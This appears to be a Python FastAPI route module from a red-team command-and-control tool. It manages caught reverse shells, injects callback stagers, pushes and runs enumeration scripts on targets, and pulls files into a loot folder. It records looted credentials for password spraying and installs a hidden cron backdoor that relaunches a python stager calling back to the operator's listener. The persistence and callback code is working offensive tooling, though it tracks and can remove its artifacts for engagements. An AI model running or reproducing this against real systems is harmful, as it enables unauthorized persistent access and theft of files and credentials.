"""Shell-session routes: listeners, the session list, and the collaborative WebSocket
terminal. This is where the sessions core meets the engagement — the adoption hook links a
caught shell to its host and flips `access_gained`, and the WS carries the multiplayer
terminal (scrollback, live output, one-driver input, presence)."""
from __future__ import annotations

import base64

from fastapi import Body, FastAPI, Header, HTTPException, WebSocket, WebSocketDisconnect

from ...sessions import tasking


def register_sessions_routes(app: FastAPI, ctx) -> None:
    mgr = ctx.sessions
    db_path = ctx.db_path
    broker = ctx.broker

    # --- engagement hook: caught shell → its host + the activity feed ------------
    def _link_host(session):
        from ...store import Store
        from .. import collab
        st = Store(db_path)
        try:
            host = next((h for h in st.all_hosts() if h.ip == session.host_ip), None)
            label = (host.hostname or session.host_ip) if host is not None else session.host_ip
            if host is not None and not getattr(host, "access_gained", False):
                host.access_gained = True
                st.upsert_host(host)
            collab.add_activity(st, "recce", "session", f"shell caught from {label}")
        except Exception:  # noqa: BLE001 — a hook must never break adoption
            pass
        finally:
            st.close()
        broker.publish({"type": "session", "event": "caught",
                        "ip": session.host_ip, "id": session.id})

    if _link_host not in mgr.hooks:
        mgr.hooks.append(_link_host)

    # push every session status change (catch / reconnect / drop) to the SSE broker so the
    # Sessions tab updates instantly instead of waiting for a poll
    mgr.on_change = lambda s: broker.publish(
        {"type": "session", "event": s.status, "id": s.id})

    # --- listeners ---------------------------------------------------------------
    @app.get("/api/listeners")
    def list_listeners():
        return [l.info() for l in mgr.listeners.values()]

    @app.post("/api/listeners")
    async def start_listener(body: dict = Body(default=None)):
        body = body or {}
        try:
            port = int(body.get("port", 0))
        except (TypeError, ValueError):
            raise HTTPException(400, "port must be an integer")
        if not (0 <= port <= 65535):
            raise HTTPException(400, "port out of range")
        tls = bool(body.get("tls", False))
        ssl_ctx = None
        if tls:
            try:
                from ...sessions.tlscert import server_ssl_context
                ssl_ctx = server_ssl_context(ctx.eng_dir)
            except Exception as e:  # noqa: BLE001 — openssl missing / cert failure
                raise HTTPException(500, f"could not set up TLS (is openssl installed?): {e}")
        try:
            lst = await mgr.start_listener(port, host=str(body.get("host", "0.0.0.0")),
                                           tls=tls, ssl_ctx=ssl_ctx)
        except OSError as e:
            raise HTTPException(409, f"could not bind: {e}")
        broker.publish({"type": "session", "event": "listener", "port": lst.port})
        return lst.info()

    @app.delete("/api/listeners/{listener_id}")
    async def stop_listener(listener_id: str):
        if not await mgr.stop_listener(listener_id):
            raise HTTPException(404, "no such listener")
        return {"ok": True}

    @app.get("/api/stager")
    def stager(tls: bool = False):
        """The robust reconnecting-PTY stager template (single source of truth — the browser
        fills {LHOST}/{PORT}/{TOKEN}). Same builder the auto-pivot injects, so no drift."""
        from ...sessions.stagers import stager_template
        return {"template": stager_template(tls)}

    # --- sessions ----------------------------------------------------------------
    @app.get("/api/sessions")
    def list_sessions(host: str = ""):
        items = mgr.list()
        if host:                                    # host drawer asks for one host's shells
            items = [s for s in items if s.host_ip == host]
        return [s.info() for s in items]

    @app.get("/api/sessions/{session_id}/transcript")
    def transcript(session_id: str):
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        # the COMPLETE history from disk (not just the live ring) so nothing is ever lost;
        # flush pending first so the very latest bytes are included
        mgr.flush_pending(session_id)
        full = mgr.store.load_transcript(session_id) if mgr.store else b""
        data = full or sess.scrollback()
        return {"id": session_id, "host_ip": sess.host_ip,
                "data": base64.b64encode(data).decode()}

    @app.post("/api/sessions/{session_id}/upgrade")
    async def upgrade(session_id: str):
        """Auto-pivot: push a reconnecting-PTY stager into a RAW shell so it upgrades itself
        into a robust session — no manual stabilize dance ('shell of a shell')."""
        import asyncio
        import uuid
        from ...sessions.stagers import upgrade_command
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if sess.pty:
            raise HTTPException(400, "already a robust PTY session")
        if not sess.connected:
            raise HTTPException(409, "shell is not currently connected")
        if not sess.local_addr or not sess.local_addr[1]:
            raise HTTPException(409, "cannot determine a callback address for this shell")
        lhost, port = sess.local_addr            # the exact endpoint the target already reached
        token = "up_" + uuid.uuid4().hex[:12]
        broker.publish({"type": "session", "event": "upgrading", "id": sess.id})
        # inject the stager and read the detection result (RECCE_UPGRADE_SENT / RECCE_NO_PYTHON)
        # detection echoes back fast on a live shell; the long tail is only a dead/hung shell
        out = await sess.run_and_capture(upgrade_command(lhost, port, token).encode(), timeout=6.0)
        cb = f"{lhost}:{port}"
        if b"RECCE_NO_PYTHON" in out:
            return {"ok": True, "upgraded": False, "callback": cb,
                    "reason": "no python/base64 on the target — use a manual payload from the catalog"}
        # wait for the stager to actually call back (a new PTY session carrying our token)
        for _ in range(20):                      # ~10s
            new = next((s for s in mgr.sessions.values()
                        if s.token == token and s.pty and s.status == "live"), None)
            if new:
                return {"ok": True, "upgraded": True, "session_id": new.id, "callback": cb}
            await asyncio.sleep(0.5)
        return {"ok": True, "upgraded": False, "callback": cb,
                "reason": f"stager launched but didn't call back — egress to {cb} may be blocked"}

    async def _push_file(sess, remote_path: str, data: bytes) -> None:
        """Write bytes to a file on the target through the shell, chunked so no single line
        exceeds the PTY canonical-mode limit (~4 KB) — base64 in small appends, then decode."""
        import shlex
        q = shlex.quote(remote_path).encode()
        b64 = base64.b64encode(data)
        await sess.send(b": > " + q + b".b64\n")            # truncate staging file
        for i in range(0, len(b64), 2048):
            await sess.send(b"printf '%s' '" + b64[i:i + 2048] + b"' >> " + q + b".b64\n")
        await sess.send(b"base64 -d " + q + b".b64 > " + q + b" && rm -f " + q + b".b64\n")

    @app.post("/api/sessions/{session_id}/enum")
    async def run_enum(session_id: str, x_tester: str = Header(default="someone")):
        """Run recce's on-target enumeration THROUGH the shell and fold the output straight
        into the engagement — the deepest tie-in: a foothold becomes findings/privesc on its
        host, no copy-paste. Pushes recce-enum.sh, runs it, captures output, then `ingest`s it."""
        import os
        import tempfile
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        enum_sh = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
                               "local", "recce-enum.sh")
        if not os.path.isfile(enum_sh):
            raise HTTPException(500, "recce-enum.sh not found")
        # push the enum script (chunked — avoids the PTY line limit), then run + capture.
        # bash (the script needs bashisms) piped through cat (so it doesn't colorize a tty).
        await _push_file(sess, "/tmp/.re.sh", open(enum_sh, "rb").read())
        out = await sess.run_and_capture(
            b"bash /tmp/.re.sh 2>/dev/null | cat; rm -f /tmp/.re.sh", timeout=240.0)
        if not out.strip():
            raise HTTPException(422, "enum produced no output (is /bin/sh / base64 present?)")
        # write the loot and fold it in via the same `ingest` pipeline imports use
        from ..jobs import recce_argv
        fd, tmp = tempfile.mkstemp(prefix="recce-sessenum-", suffix=".txt")

        def _done(job, _tmp=tmp):
            try:
                os.remove(_tmp)
            except OSError:
                pass
            broker.publish({"type": "scan", "status": job.status, "tester": x_tester,
                            "targets": f"ingest shell-enum {sess.host_ip}"})

        try:
            with os.fdopen(fd, "wb") as fh:
                fh.write(out)
            job = ctx.jobs.start(
                recce_argv("ingest", tmp, "-o", ctx.eng_dir, "--host", sess.host_ip),
                on_done=_done)
        except BaseException:
            try:
                os.remove(tmp)
            except OSError:
                pass
            raise
        broker.publish({"type": "session", "event": "enum", "id": sess.id})
        return {"ok": True, "mode": "job", "id": job.id, "bytes": len(out)}

    @app.post("/api/sessions/{session_id}/download")
    async def download(session_id: str, body: dict = Body(...)):
        """Pull a file off the target through the shell (base64 over the channel) and save it
        into the engagement's session-loot dir."""
        import os
        import shlex
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        path = str(body.get("path", "")).strip()
        if not path:
            raise HTTPException(400, "path required")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        out = await sess.run_and_capture(b"base64 " + shlex.quote(path).encode() + b" 2>/dev/null")
        cleaned = bytes(c for c in out if c not in b"\r\n \t")
        if not cleaned:
            raise HTTPException(422, "no data — file missing, unreadable, or base64 unavailable")
        try:
            raw = base64.b64decode(cleaned, validate=True)
        except Exception:
            raise HTTPException(422, "could not decode the transferred data")
        ddir = os.path.join(ctx.eng_dir, "session-loot")
        os.makedirs(ddir, exist_ok=True)
        dest = os.path.join(ddir, f"{sess.host_ip}_{os.path.basename(path) or 'download'}")
        with open(dest, "wb") as f:
            f.write(raw)
        broker.publish({"type": "session", "event": "download", "id": sess.id})
        return {"ok": True, "saved": dest, "size": len(raw)}

    @app.post("/api/sessions/{session_id}/upload")
    async def upload(session_id: str, body: dict = Body(...)):
        """Push a file to the target through the shell (chunked base64 → base64 -d)."""
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        path = str(body.get("path", "")).strip()
        data_b64 = str(body.get("data", ""))
        if not path or not data_b64:
            raise HTTPException(400, "path and data (base64) required")
        try:
            raw = base64.b64decode(data_b64, validate=True)
        except Exception:
            raise HTTPException(400, "data must be base64")
        if len(raw) > 5_000_000:
            raise HTTPException(413, "file too large (max ~5 MB)")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        await _push_file(sess, path, raw)           # chunked — safe past the PTY line limit
        broker.publish({"type": "session", "event": "upload", "id": sess.id})
        return {"ok": True, "bytes": len(raw)}

    # --- persistence: the resilient service (INTRUSIVE — writes a backdoor; tracked+removable)
    @app.post("/api/sessions/{session_id}/persist")
    async def persist(session_id: str, body: dict = Body(default=None),
                      x_tester: str = Header(default="someone")):
        import shlex
        import time
        import uuid
        from ...sessions.stagers import python_stager
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        if not sess.connected:
            raise HTTPException(409, "shell not connected")
        if not sess.local_addr or not sess.local_addr[1]:
            raise HTTPException(409, "cannot determine a callback address")
        body = body or {}
        if str(body.get("mechanism", "cron")) != "cron":
            raise HTTPException(400, "only the 'cron' mechanism is supported so far")
        lhost, lport = sess.local_addr
        pid = uuid.uuid4().hex[:10]
        marker = "rc" + pid[:6]
        # resolve $HOME so the artifact lands somewhere that survives a reboot (not /tmp)
        home = (await sess.run_and_capture(b'printf %s "$HOME"')).strip().decode("ascii", "replace") or "/root"
        path = f"{home}/.cache/.{marker}"
        qpath = shlex.quote(path)
        await sess.send(b"mkdir -p " + shlex.quote(f"{home}/.cache").encode() + b"\n")
        await _push_file(sess, path, python_stager(lhost, lport, "ps_" + pid).encode())
        # cron: @reboot (survives reboot) + a */10 guard that relaunches only if it died
        cron = (f"# recce-persist {marker}\\n"
                f"@reboot (python3 {qpath} >/dev/null 2>&1 &)\\n"
                f"*/10 * * * * pgrep -f {marker} >/dev/null 2>&1 || (python3 {qpath} >/dev/null 2>&1 &)\\n")
        install = (f"(crontab -l 2>/dev/null; printf '{cron}') | crontab - 2>/dev/null "
                   "&& echo RECCE_PERSIST_OK || echo RECCE_PERSIST_FAIL")
        out = await sess.run_and_capture(install.encode(), timeout=10.0)
        ok = b"RECCE_PERSIST_OK" in out
        # the removal command is captured NOW, at install time, so cleanup never has to guess
        remove_cmd = (f"crontab -l 2>/dev/null | grep -v {marker} | crontab - 2>/dev/null; "
                      f"rm -f {qpath}; pkill -f {marker} 2>/dev/null; echo RECCE_UNPERSIST_OK")
        if mgr.store is not None:                 # record even on reported failure (artifacts may exist)
            mgr.store.add_persistence({
                "id": pid, "host_ip": sess.host_ip, "mechanism": "cron", "artifact_path": path,
                "remove_cmd": remove_cmd, "installed_by": x_tester, "installed_at": time.time(),
                "removed_at": None})
        from .. import collab
        from ...store import Store
        st = Store(db_path)
        try:
            collab.add_activity(st, x_tester, "add",
                                f"{x_tester} installed cron persistence on {sess.host_ip} (intrusive)")
        finally:
            st.close()
        broker.publish({"type": "session", "event": "persist", "id": sess.id})
        if not ok:
            return {"ok": False, "id": pid,
                    "reason": "cron install reported failure (no crontab on the target?) — recorded for cleanup anyway"}
        return {"ok": True, "id": pid, "mechanism": "cron", "path": path}

    @app.get("/api/persistence")
    def list_persistence(host: str = ""):
        if mgr.store is None:
            return []
        return mgr.store.list_persistence(host_ip=host)

    @app.post("/api/persistence/remove-all")
    async def remove_all_persistence():
        """Engagement-end sweep: reverse every tracked backdoor across all hosts, and LOUDLY
        report any it couldn't reach (host offline → needs manual cleanup)."""
        import time
        if mgr.store is None:
            raise HTTPException(500, "no store")
        removed: list[str] = []
        failed: list[dict] = []
        for rec in mgr.store.list_persistence(active_only=True):
            target = next((s for s in mgr.sessions.values()
                           if s.host_ip == rec["host_ip"] and s.connected), None)
            if target is None:
                failed.append({"id": rec["id"], "host_ip": rec["host_ip"],
                               "path": rec["artifact_path"], "reason": "no live shell — MANUAL CLEANUP"})
                continue
            out = await target.run_and_capture(rec["remove_cmd"].encode(), timeout=10.0)
            if b"RECCE_UNPERSIST_OK" in out:
                mgr.store.mark_persistence_removed(rec["id"], time.time())
                removed.append(rec["id"])
            else:
                failed.append({"id": rec["id"], "host_ip": rec["host_ip"],
                               "path": rec["artifact_path"], "reason": "removal didn't confirm — verify by hand"})
        broker.publish({"type": "session", "event": "unpersist", "id": "all"})
        return {"removed": len(removed), "failed": failed}

    @app.post("/api/persistence/{pid}/remove")
    async def remove_persistence(pid: str):
        import time
        if mgr.store is None:
            raise HTTPException(500, "no store")
        rec = mgr.store.get_persistence(pid)
        if rec is None:
            raise HTTPException(404, "no such persistence record")
        if rec.get("removed_at"):
            return {"ok": True, "already_removed": True}
        # replay the exact removal through any live shell on that host
        target = next((s for s in mgr.sessions.values()
                       if s.host_ip == rec["host_ip"] and s.connected), None)
        if target is None:
            return {"ok": False, "reason": "no live shell on this host to run the removal — "
                    "reconnect a shell there, then remove"}
        out = await target.run_and_capture(rec["remove_cmd"].encode(), timeout=10.0)
        if b"RECCE_UNPERSIST_OK" not in out:
            return {"ok": False, "reason": "removal command didn't confirm — verify by hand"}
        mgr.store.mark_persistence_removed(pid, time.time())
        broker.publish({"type": "session", "event": "unpersist", "id": rec["host_ip"]})
        return {"ok": True, "id": pid}

    @app.post("/api/sessions/{session_id}/cred")
    def loot_cred(session_id: str, body: dict = Body(...),
                  x_tester: str = Header(default="someone")):
        """Fold a credential found in this shell into the store — auto-attributed to the
        session's host, so it lands in Loot and the spray plan (feeds the Act loop)."""
        from ...models import Credential
        from ...store import Store
        from .. import collab
        sess = mgr.get(session_id)
        if sess is None:
            raise HTTPException(404, "no such session")
        user = str(body.get("username", "")).strip()
        secret = str(body.get("secret", "")).strip()
        if not user and not secret:
            raise HTTPException(400, "a username or secret is required")
        kind = str(body.get("kind", "password"))
        if kind not in ("password", "nthash", "hash", "blank"):
            kind = "password"
        st = Store(db_path)
        try:
            added = st.add_credential(Credential(
                username=user, secret=secret, kind=kind,
                domain=str(body.get("domain", "")), origin_ip=sess.host_ip,
                source="shell-session", notes=f"looted from shell on {sess.host_ip}"))
            collab.add_activity(st, x_tester, "add",
                                f"{x_tester} looted a credential from the shell on {sess.host_ip}")
        finally:
            st.close()
        broker.publish({"type": "add", "what": "credential", "by": x_tester})
        return {"ok": True, "added": added}

    # --- the collaborative terminal (WebSocket) ---------------------------------
    @app.websocket("/api/sessions/{session_id}/attach")
    async def attach(ws: WebSocket, session_id: str):
        await ws.accept()
        sess = mgr.get(session_id)
        if sess is None:
            await ws.send_json({"t": "error", "msg": "no such session"})
            await ws.close()
            return
        tester = ws.query_params.get("tester", "someone")

        q = sess.subscribe()
        sess.attach(tester)
        # replay scrollback, then current presence, then stream live
        await ws.send_json({"t": "scrollback",
                            "data": base64.b64encode(sess.scrollback()).decode()})
        await ws.send_json({"t": "presence", "driver": sess.driver,
                            "attached": sorted(sess.attached)})

        import asyncio

        async def pump_out():
            while True:
                env = await q.get()
                if env["t"] == "out":
                    await ws.send_json({"t": "out",
                                        "data": base64.b64encode(env["data"]).decode()})
                else:
                    await ws.send_json(env)     # status / presence pass through

        out_task = asyncio.ensure_future(pump_out())
        try:
            while True:
                msg = await ws.receive_json()
                t = msg.get("t")
                if t == "in" and sess.driver == tester:
                    data = base64.b64decode(msg.get("data", ""))
                    await tasking.send_input(sess, data)
                elif t == "wheel":
                    sess.take_wheel(tester)
                elif t == "resize" and sess.pty:
                    # propagate the terminal size to the stager's PTY (vim/nano/less work)
                    rows = int(msg.get("rows", 0) or 0)
                    cols = int(msg.get("cols", 0) or 0)
                    if rows and cols:
                        await sess.send(b"\x1bW%d,%d\n" % (rows, cols))
        except WebSocketDisconnect:
            pass
        finally:
            out_task.cancel()
            sess.unsubscribe(q)
            sess.detach(tester)
